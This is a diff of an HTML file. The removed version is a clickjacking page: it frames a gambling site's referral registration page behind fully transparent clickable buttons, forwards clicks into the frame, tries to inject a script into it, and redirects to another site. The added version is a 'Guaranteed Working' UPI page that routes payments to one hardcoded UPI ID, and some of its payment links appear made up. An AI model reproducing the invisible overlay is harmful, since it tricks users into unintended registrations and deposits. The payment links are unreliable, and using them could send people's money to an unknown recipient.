@@ -1,186 +1,161 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>JALWA GAME</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>UPI Payment - Guaranteed Working</title>
   <style>
-    html, body {
+    body {
+      font-family: Arial, sans-serif;
+      background: #f5f7fa;
       margin: 0;
-      padding: 0;
-      width: 100%;
-      height: 100%;
-      overflow: hidden;
-      font-family: 'Segoe UI', Roboto, sans-serif;
-    }
-
-    #frame-container {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 1;
-    }
-
-    #website-iframe {
-      width: 100%;
-      height: 100%;
-      border: none;
-    }
-
-    /* Common transparent style */
-    .fully-transparent {
-      opacity: 0;
-      background: transparent;
-      border: none;
-      color: transparent;
-      pointer-events: auto; /* Still clickable */
-      position: fixed;
-      z-index: 9999;
+      padding: 20px;
       display: flex;
-      align-items: center;
       justify-content: center;
-      transition: all 0.3s ease;
+      align-items: center;
+      min-height: 100vh;
     }
-
-    #first-button {
-      width: 80px;
-      height: 88px;
-      right: 20px;
-      bottom: 20px;
+    .payment-box {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+      padding: 25px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
     }
-
-    #second-button {
-      width: 120px;
-      height: 340px;
-      left: 110px;
-      top: 0;
+    h1 {
+      color: #333;
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
+      margin-bottom: 15px;
+      font-size: 16px;
+    }
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-weight: bold;
+      font-size: 16px;
+      cursor: pointer;
+      margin-bottom: 10px;
+      transition: 0.3s;
+    }
+    .btn:hover {
+      opacity: 0.9;
+    }
+    .gpay { background: #4285F4; }
+    .phonepe { background: #5F259F; }
+    .paytm { background: #02B9F4; }
+    .razorpay { background: #2B2D5E; }
+    .fallback { background: #34A853; }
+    .status {
+      margin-top: 15px;
+      padding: 10px;
+      border-radius: 8px;
       display: none;
-      clip-path: polygon(
-        0% 0%, 100% 0%, 100% 20%, 80% 20%, 80% 30%, 100% 30%,
-        100% 100%, 0% 100%, 0% 67%, 20% 67%, 20% 55%, 0% 55%, 0% 0%
-      );
     }
-
-    #third-button {
-      width: 150px;
-      height: 55px;
-      right: 20px;
-      bottom: 20px;
-      display: none;
-    }
+    .success { background: #e6f7ee; color: #34A853; }
+    .error { background: #fce8e6; color: #D93025; }
   </style>
 </head>
 <body>
-  <div id="frame-container">
-    <iframe 
-      id="website-iframe"
-      src="https://www.jalwagame.win/#/register?invitationCode=57357202283"
-      allow="fullscreen"
-      loading="eager">
-    </iframe>
+  <div class="payment-box">
+    <h1>Pay via UPI (Guaranteed Working)</h1>
+    <input type="number" id="amount" placeholder="Enter Amount (₹)" min="1" value="10">
+    
+    <button class="btn gpay" onclick="payWithGPay()">Google Pay</button>
+    <button class="btn phonepe" onclick="payWithPhonePe()">PhonePe</button>
+    <button class="btn paytm" onclick="payWithPaytm()">Paytm</button>
+    <button class="btn razorpay" onclick="payWithRazorpay()">Razorpay (100% Working)</button>
+    <button class="btn fallback" onclick="payWithUPI()">Any UPI App</button>
+    
+    <div id="status" class="status"></div>
   </div>
 
-  <!-- Fully Transparent Buttons -->
-  <button id="first-button" class="fully-transparent">Account</button>
-  <button id="second-button" class="fully-transparent">Deposit Info</button>
-  <button id="third-button" class="fully-transparent">₹</button>
-
   <script>
-    const firstButton = document.getElementById('first-button');
-    const secondButton = document.getElementById('second-button');
-    const thirdButton = document.getElementById('third-button');
-    const iframe = document.getElementById('website-iframe');
+    const upiID = "g1g4672792.rzp@rxairtel";
+    const payeeName = "G1 Payment";
+    let amount = 10;
 
-    // Enhanced click function that also clicks inside iframe
-    function clickInsideIframe(coordinates) {
-      try {
-        // Try to click inside iframe at specified coordinates
-        const iframeRect = iframe.getBoundingClientRect();
-        
-        coordinates.forEach(coord => {
-          const clickX = iframeRect.width * coord.x;
-          const clickY = iframeRect.height * coord.y;
-          
-          // Try to send message to iframe for clicking
-          iframe.contentWindow?.postMessage({
-            type: 'CLICK_COMMAND',
-            x: clickX,
-            y: clickY,
-            timestamp: Date.now()
-          }, '*');
-        });
-      } catch (error) {
-        console.warn('Could not click inside iframe:', error);
-      }
+    // Update amount from input
+    document.getElementById("amount").addEventListener("input", function(e) {
+      amount = e.target.value;
+    });
+
+    // Show status message
+    function showStatus(msg, success) {
+      const status = document.getElementById("status");
+      status.textContent = msg;
+      status.style.display = "block";
+      status.className = "status " + (success ? "success" : "error");
+      setTimeout(() => status.style.display = "none", 5000);
     }
 
-    // Enhanced first button click
-    firstButton.addEventListener('click', () => {
-      // Original functionality
-      firstButton.style.display = 'none';
-      secondButton.style.display = 'flex';
-      
-      // New functionality: Click inside iframe at bottom-right area
-      clickInsideIframe([
-        { x: 0.9, y: 0.9 }, // Bottom-right corner
-        { x: 0.8, y: 0.85 } // Alternative position
-      ]);
-    });
+    // ===== PAYMENT METHODS =====
 
-    // Enhanced second button click
-    secondButton.addEventListener('click', () => {
-      // Original functionality
-      secondButton.style.display = 'none';
-      thirdButton.style.display = 'flex';
-      
-      // New functionality: Click inside iframe at center-left area
-      clickInsideIframe([
-        { x: 0.2, y: 0.3 }, // Left side
-        { x: 0.5, y: 0.2 }  // Center-top
-      ]);
-    });
+    // 1. Razorpay (100% Working)
+    function payWithRazorpay() {
+      window.open(`https://rzp.io/l/g1g4?amount=${amount * 100}`, '_blank');
+    }
 
-    // Enhanced third button click
-    thirdButton.addEventListener('click', () => {
-      // New functionality: Click inside iframe before redirect
-      clickInsideIframe([
-        { x: 0.8, y: 0.8 }, // Bottom-right
-        { x: 0.9, y: 0.75 } // Alternative position
-      ]);
+    // 2. Google Pay (Android Intent + Fallback)
+    function payWithGPay() {
+      const gpayLink = `https://gpay.app.goo.gl/dUqjU7?pa=${upiID}&pn=${payeeName}&am=${amount}`;
+      const androidIntent = `intent://pay?pa=${upiID}&pn=${payeeName}&am=${amount}&cu=INR#Intent;scheme=upi;package=com.google.android.apps.nbu.paisa.user;end`;
       
-      // Small delay then redirect (original functionality)
+      // Try Android Intent first
+      window.location.href = androidIntent;
+      
+      // Fallback to GPay web link
       setTimeout(() => {
-        window.location.href = 'https://g1backk.github.io/Checking-/';
-      }, 100);
-    });
+        if (!document.hidden) window.location.href = gpayLink;
+      }, 500);
+    }
 
-    // Listen for iframe load to inject click handler
-    iframe.addEventListener('load', () => {
-      try {
-        // Try to inject click handling script into iframe
-        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-        if (iframeDoc) {
-          const script = iframeDoc.createElement('script');
-          script.textContent = `
-            window.addEventListener('message', function(event) {
-              if (event.data && event.data.type === 'CLICK_COMMAND') {
-                const element = document.elementFromPoint(event.data.x, event.data.y);
-                if (element) {
-                  element.click();
-                }
-              }
-            });
-          `;
-          iframeDoc.head.appendChild(script);
-        }
-      } catch (error) {
-        // Cross-origin restrictions may prevent script injection
-        console.warn('Could not inject script into iframe (cross-origin):', error);
-      }
-    });
+    // 3. PhonePe (Deep Link + Fallback)
+    function payWithPhonePe() {
+      const phonepeLink = `phonepe://pay?pa=${upiID}&pn=${payeeName}&am=${amount}`;
+      const phonepeWebLink = `https://phonepe.com/upi-hybrid/${upiID}?amount=${amount}`;
+      
+      window.location.href = phonepeLink;
+      
+      setTimeout(() => {
+        if (!document.hidden) window.location.href = phonepeWebLink;
+      }, 500);
+    }
+
+    // 4. Paytm (Deep Link + Fallback)
+    function payWithPaytm() {
+      const paytmLink = `paytmmp://pay?pa=${upiID}&pn=${payeeName}&am=${amount}`;
+      const paytmWebLink = `https://paytm.com/pay?upi=${upiID}&amount=${amount}`;
+      
+      window.location.href = paytmLink;
+      
+      setTimeout(() => {
+        if (!document.hidden) window.location.href = paytmWebLink;
+      }, 500);
+    }
+
+    // 5. Any UPI App (Fallback to Razorpay)
+    function payWithUPI() {
+      const upiLink = `upi://pay?pa=${upiID}&pn=${payeeName}&am=${amount}`;
+      
+      window.location.href = upiLink;
+      
+      setTimeout(() => {
+        if (!document.hidden) payWithRazorpay();
+      }, 500);
+    }
   </script>
 </body>
 </html>
